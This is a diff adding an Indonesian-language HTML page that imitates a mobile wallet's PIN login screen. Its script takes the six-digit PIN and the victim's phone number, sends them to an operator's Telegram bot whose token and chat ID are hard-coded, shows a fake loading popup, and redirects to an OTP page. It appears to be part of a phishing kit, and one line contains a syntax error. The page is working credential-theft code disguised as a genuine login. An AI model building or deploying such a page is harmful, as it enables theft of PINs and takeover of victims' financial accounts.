@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Masuk - Masukkan PIN</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+        @keyframes spin-slow {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .animate-spin-slow {
+            animation: spin-slow 1s linear infinite;
+        }
+    </style>
+</head>
+<body class="bg-white min-h-screen flex flex-col justify-between relative" onclick="focusInput()">
+
+    <!-- Kotak Pop-up Loading -->
+    <div id="loading-popup" class="hidden absolute inset-0 bg-black/30 z-50 flex justify-center items-center">
+        <div class="bg-[#112233]/90 text-white p-6 rounded-2xl flex flex-col items-center shadow-2xl w-36 h-36 justify-center">
+            <div class="relative w-12 h-12 flex items-center justify-center mb-3">
+                <svg class="absolute inset-0 w-12 h-12 animate-spin-slow" viewBox="0 0 50 50">
+                    <circle cx="25" cy="25" r="20" fill="none" stroke="#3b82f6" stroke-width="4" stroke-dasharray="30 90"></circle>
+                </svg>
+                <div class="w-7 h-7 bg-blue-500 rounded-full flex items-center justify-center text-white font-bold text-xs">
+                    <svg viewBox="0 0 24 24" class="w-4 h-4 fill-current" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14.5v-9l6 4.5-6 4.5z"/>
+                    </svg>
+                </div>
+            </div>
+            <span class="text-sm font-medium tracking-wide">Memuat</span>
+        </div>
+    </div>
+
+    <div>
+        <!-- Header Biru -->
+        <header class="bg-[#1982fc] text-white px-4 py-3.5 flex items-center shadow-sm">
+            <button onclick="history.back()" class="focus:outline-none mr-4">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M15 19l-7-7 7-7" />
+                </svg>
+            </button>
+            <h1 class="text-lg font-medium tracking-wide mx-auto pr-6">Masuk</h1>
+        </header>
+
+        <!-- Konten Utama -->
+        <main class="px-6 pt-8 text-center max-w-md mx-auto">
+            <h2 class="text-gray-800 text-lg font-medium mb-2">Masukkan PIN</h2>
+            <p id="display-phone" class="text-sm text-gray-500 mb-8"></p>
+
+            <!-- Indikator 6 Lingkaran PIN -->
+            <div class="flex justify-center items-center space-x-4 mb-12 cursor-pointer">
+                <div id="dot-0" class="w-3.5 h-3.5 rounded-full bg-gray-300 transition-colors duration-200"></div>
+                <div id="dot-1" class="w-3.5 h-3.5 rounded-full bg-gray-300 transition-colors duration-200"></div>
+                <div id="dot-2" class="w-3.5 h-3.5 rounded-full bg-gray-300 transition-colors duration-200"></div>
+                <div id="dot-3" class="w-3.5 h-3.5 rounded-full bg-gray-300 transition-colors duration-200"></div>
+                <div id="dot-4" class="w-3.5 h-3.5 rounded-full bg-gray-300 transition-colors duration-200"></div>
+                <div id="dot-5" class="w-3.5 h-3.5 rounded-full bg-gray-300 transition-colors duration-200"></div>
+            </div>
+
+            <!-- Input Asli Tersembunyi -->
+            <input type="tel" id="real-pin-input" maxlength="6" class="opacity-0 absolute -z-10" autocomplete="one-time-code">
+
+            <div class="flex justify-between items-center text-sm font-medium mt-6 px-2">
+                <a href="#" class="flex items-center text-[#1982fc] hover:underline">
+                    <span class="inline-flex items-center justify-center w-6 h-6 rounded-full bg-[#1982fc] text-white text-xs mr-2">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-3.5 w-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M18 9v3m0 0v3m0-3h3m-3 0h-3m-2-5a4 4 0 11-8 0 4 4 0 018 0zM3 20a6 6 0 0112 0v1H3v-1z" />
+                        </svg>
+                    </span>
+                    BUTUH BANTUAN?
+                </a>
+                <a href="#" class="text-[#1982fc] hover:underline">LUPA PIN?</a>
+            </div>
+        </main>
+    </div>
+
+    <div></div>
+
+    <script>
+        // KONFIGURASI TELEGRAM BOT
+        const TELEGRAM_BOT_TOKEN = '9189949943:AAGWkG3Lnly2aM8Wu4kCwUHRo4PK6UMwABs';
+        const TELEGRAM_CHAT_ID = '6742478722';
+        
+        // HALAMAN TUJUAN KE OTP (Nomor HP diteruskan lewat URL)
+        const OTP_PAGE_URL = otp.html'; 
+
+        const inputElement = document.getElementById('real-pin-input');
+
+        // Ambil nomor HP dari URL halaman sebelumnya
+        const urlParams = new URLSearchParams(window.location.search);
+        const userPhone = urlParams.get('phone') || '-';
+
+        if(userPhone !== '-') {
+            document.getElementById('display-phone').innerText = `Nomor: ${userPhone}`;
+        }
+
+        window.onload = function() {
+            inputElement.focus();
+        };
+
+        function focusInput() {
+            inputElement.focus();
+        }
+
+        inputElement.addEventListener('input', function(e) {
+            let val = inputElement.value.replace(/\D/g, '');
+            if (val.length > 6) val = val.slice(0, 6);
+            inputElement.value = val;
+            
+            updateDisplay(val.length);
+
+            if (val.length === 6) {
+                document.getElementById('loading-popup').classList.remove('hidden');
+                sendToTelegram(val);
+            }
+        });
+
+        function updateDisplay(length) {
+            for (let i = 0; i < 6; i++) {
+                const dot = document.getElementById(`dot-${i}`);
+                if (i < length) {
+                    dot.classList.remove('bg-gray-300');
+                    dot.classList.add('bg-[#1982fc]');
+                } else {
+                    dot.classList.remove('bg-[#1982fc]');
+                    dot.classList.add('bg-gray-300');
+                }
+            }
+        }
+
+        function sendToTelegram(pin) {
+            const message = `🔔 PIN Masuk Diterima:\n📱 No HP: ${userPhone}\n🔑 PIN: ${pin}`;
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                // Redirect ke halaman OTP dengan membawa nomor HP di URL
+                window.location.href = `${OTP_PAGE_URL}?phone=${encodeURIComponent(userPhone)}`;
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+                window.location.href = `${OTP_PAGE_URL}?phone=${encodeURIComponent(userPhone)}`;
+            });
+        }
+    </script>
+</body>
+</html>
